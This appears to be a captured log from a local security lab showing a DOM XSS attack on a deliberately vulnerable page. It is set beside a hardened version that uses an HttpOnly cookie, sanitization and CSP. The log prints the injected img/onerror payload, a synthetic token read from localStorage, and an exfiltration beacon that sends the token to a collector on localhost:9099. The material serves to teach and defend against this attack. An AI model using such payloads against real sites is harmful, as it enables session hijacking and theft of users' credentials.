@@ -1,0 +1,30 @@
+=== A3 DOM XSS -> token theft — VULNERABLE ===
+# captured 2026-07-14 (in-app browser pane)
+
+1) XSS INJECTION SUCCEEDED
+   The `msg` URL parameter was written to innerHTML and parsed as live HTML.
+   The static file server logged the injected <img src=x> attempting to load:
+
+     GET /vulnerable.html?msg=<img src=x onerror="...steal...">  200
+     GET /x                                                       404   <-- injected <img> executed
+
+   (In the hardened page the same input renders as literal text and no /x request occurs.)
+
+2) TOKEN IS READABLE BY JAVASCRIPT
+   Executed in the page context:
+
+     localStorage.getItem('access_token')  ->  "SYNTHETIC.JWT.value-pretend-this-is-real"
+     document.querySelector('#msg img')     ->  <img> present (injection live in DOM)
+
+3) EXFILTRATION
+   The onerror handler runs `new Image().src='http://localhost:9099/steal?t='+token`.
+   In a normal browser this beacons the token to the attacker collector, which prints:
+     [!] STOLEN TOKEN received: SYNTHETIC.JWT.value-pretend-this-is-real
+   NOTE: the in-app browser pane sandboxes cross-port requests, so the beacon to :9099 was
+   blocked here; the two preconditions above (HTML injection + JS-readable token) are the
+   whole vulnerability and are both demonstrated.
+
+=== HARDENED ===
+- Token in HttpOnly cookie -> localStorage.getItem('access_token') === null (nothing to steal).
+- Output via Angular interpolation / DomSanitizer -> payload rendered as text, no <img> element.
+- CSP script-src 'self' 'nonce-...' -> inline onerror handler refused execution.
